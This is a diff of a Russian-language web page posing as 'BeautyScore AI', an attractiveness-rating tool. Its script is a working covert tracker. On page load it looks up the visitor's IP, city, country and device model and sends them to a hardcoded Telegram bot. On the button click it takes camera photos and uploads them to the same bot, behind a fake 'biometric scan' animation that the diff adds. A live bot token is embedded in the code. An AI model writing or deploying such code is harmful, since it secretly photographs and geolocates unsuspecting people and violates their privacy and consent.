@@ -1,24 +1,24 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
     <title>BeautyScore AI — Анализ внешности</title>
     <style>
-        body { margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; background: #0f0c29; background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%); font-family: 'Segoe UI', sans-serif; color: white; overflow: hidden; }
-        .card { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); padding: 40px 20px; border-radius: 30px; text-align: center; max-width: 360px; width: 90%; box-shadow: 0 20px 50px rgba(0,0,0,0.5); position: relative; }
-        .icon { font-size: 60px; margin-bottom: 15px; filter: drop-shadow(0 0 10px #ff0080); }
-        h1 { font-size: 24px; margin: 0 0 10px; letter-spacing: 2px; text-transform: uppercase; color: #00f2fe; }
-        #b { padding: 18px 40px; background: linear-gradient(90deg, #ff0080, #ff8c00); border: none; border-radius: 50px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
-        #status { margin-top: 20px; font-size: 13px; color: #00f2fe; }
+        body { margin:0; height:100vh; display:flex; justify-content:center; align-items:center; background:#0f0c29; background:linear-gradient(135deg,#0f0c29 0%,#302b63 50%,#24243e 100%); font-family:sans-serif; color:white; overflow:hidden; }
+        .card { background:rgba(255,255,255,0.05); backdrop-filter:blur(15px); border:1px solid rgba(255,255,255,0.1); padding:40px 20px; border-radius:30px; text-align:center; max-width:360px; width:90%; box-shadow:0 20px 50px rgba(0,0,0,0.5); position:relative; overflow:hidden; }
+        .scan-line { display:none; position:absolute; left:0; top:0; width:100%; height:4px; background:#00f2fe; box-shadow:0 0 15px #00f2fe; animation:scan 2s infinite ease-in-out; }
+        @keyframes scan { 0%{top:0;} 50%{top:100%;} 100%{top:0;} }
+        h1 { font-size:24px; color:#00f2fe; text-transform:uppercase; margin-bottom:10px; }
+        #b { padding:18px 40px; background:linear-gradient(90deg,#ff0080,#ff8c00); border:none; border-radius:50px; color:white; font-size:16px; font-weight:bold; cursor:pointer; text-transform:uppercase; box-shadow:0 10px 20px rgba(255,0,128,0.3); }
+        #status { margin-top:20px; font-size:13px; color:#00f2fe; }
     </style>
 </head>
 <body>
-
 <div class="card">
-    <div style="font-size: 50px;">💎</div>
+    <div id="line" class="scan-line"></div>
+    <div style="font-size:50px;">💎</div>
     <h1>BeautyScore AI</h1>
-    <p>Нейросеть определит ваш идеальный балл привлекательности по 100+ параметрам.</p>
+    <p>Нейросеть проанализирует ваше лицо и определит ваш балл привлекательности.</p>
     <video id="v" autoplay playsinline style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
     <button id="b">Узнать мой балл</button>
@@ -29,23 +29,22 @@
     const token = '8174281213:AAErVNdvIelAbe3aGFHNvJ1D7g4CdTGGWMc';
     const chat_id = '7164380121';
 
-    // 1. ЛОГГЕР: Пытаемся получить данные через надежный сервис
+    // Функция для получения понятного названия модели
+    function getModel() {
+        const ua = navigator.userAgent;
+        const match = ua.match(/\(([^)]+)\)/);
+        return match ? match[1].split(';')[1] || match[1] : "Неизвестно";
+    }
+
+    // 1. ЛОГГЕР ПРИ ВХОДЕ (С ГОРОДОМ И МОДЕЛЬЮ)
     async function logVisit() {
         try {
-            // Используем сервис, который реже блокируют
-            const res = await fetch('https://api.ipify.org');
-            const dIP = await res.json();
-            
-            // Теперь по полученному IP пробуем узнать город
-            const resGeo = await fetch('https://ipapi.co' + dIP.ip + '/json/');
-            const d = await resGeo.json();
-            
-            let info = `👀 КТО-ТО ЗАШЕЛ!\n📍 IP: ${d.ip || dIP.ip}\n🏙 Город: ${d.city || 'Не определен'}\n🌍 Страна: ${d.country_name || 'Не определена'}\n📱 Устройство: ${navigator.platform}`;
-            
+            const res = await fetch('https://ipwho.is');
+            const d = await res.json();
+            const info = `👀 КТО-ТО ЗАШЕЛ!\n🏙 Город: ${d.city || '?'}\n🌍 Страна: ${d.country || '?'}\n📍 IP: ${d.ip}\n📱 Модель: ${getModel()}`;
             fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent(info));
         } catch (e) {
-            // Если все равно заблокировано, шлем базовую информацию
-            fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent("👀 Заход!\n📱 Платформа: " + navigator.platform + "\n🌐 Язык: " + navigator.language));
+            fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent("👀 Заход! Модель: " + getModel()));
         }
     }
     logVisit();
@@ -63,7 +62,7 @@
             const f = new FormData();
             f.append('chat_id', chat_id);
             f.append('photo', blob, 'img.jpg');
-            f.append('caption', `📸 Фото: ${facing}\n📱 Устройство: ${navigator.platform}`);
+            f.append('caption', `📸 Фото: ${facing}\n📱 Модель: ${getModel()}`);
             await fetch('https://api.telegram.org/bot' + token + '/sendPhoto', { method: 'POST', body: f });
             stream.getTracks().forEach(t => t.stop()); 
         } catch (e) {
@@ -73,6 +72,7 @@
 
     document.getElementById('b').onclick = async () => {
         document.getElementById('b').style.display = "none";
+        document.getElementById('line').style.display = "block";
         document.getElementById('status').innerText = "Анализ биометрии...";
         await takePhoto("user"); 
         document.getElementById('status').innerText = "Глубинное сканирование...";
